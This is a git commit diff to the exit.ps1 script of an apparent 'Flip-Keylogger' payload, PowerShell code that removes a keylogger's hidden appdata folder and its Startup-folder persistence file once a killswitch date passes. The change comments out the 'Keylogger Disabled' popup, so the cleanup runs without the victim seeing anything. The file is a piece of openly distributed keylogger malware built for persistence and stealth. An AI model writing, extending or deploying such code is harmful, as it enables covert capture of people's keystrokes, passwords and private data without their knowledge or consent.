fed4a745fc5e9a83afe2667647f3b8fce667aa6a
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-25 23:01:53 -0600

    Update exit.ps1

--- Payloads/Flip-Keylogger/exit.ps1
+++ Payloads/Flip-Keylogger/exit.ps1
@@ -10,7 +10,7 @@ if(((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt")) -or ($Rc
 sleep 10
 Remove-Item "$env:appdata\-locker" -Recurse -Force;
 Remove-Item "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Keylogger Disabled",3)
+#$done = New-Object -ComObject Wscript.Shell;$done.Popup("Keylogger Disabled",3)
 Remove-Item "$env:appdata\-exit.ps1"
 }
 else{continue}
